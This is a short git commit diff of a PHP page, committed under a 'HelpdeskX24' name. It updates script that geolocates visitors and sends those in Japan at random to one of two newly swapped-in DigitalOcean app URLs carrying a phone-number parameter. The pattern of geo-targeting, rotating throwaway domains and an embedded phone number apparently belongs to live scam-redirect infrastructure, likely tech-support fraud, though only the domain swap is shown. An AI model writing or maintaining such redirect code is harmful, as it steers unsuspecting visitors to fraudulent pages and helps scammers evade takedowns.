657a260dcd241b7987e46127159084bb08f376b4
HelpdeskX24 <peertanveer581@gmail.com>
2026-01-28 12:35:56 +0530

    Update index.php

--- index.php
+++ index.php
@@ -18,8 +18,8 @@ fetch("https://ipwho.is/")
 
     if (countryCode === "JP") {
       (function () {
-        const domainA = "https://stingray-app-egpnc.ondigitalocean.app/?bcda=(050)-3097-5847";
-        const domainB = "https://clownfish-app-f5flq.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainA = "https://whale-app-aygay.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainB = "https://coral-app-7mbya.ondigitalocean.app/?bcda=(050)-3097-5847";
 
         // Random number between 0 and 1
         if (Math.random() < 0.5) {
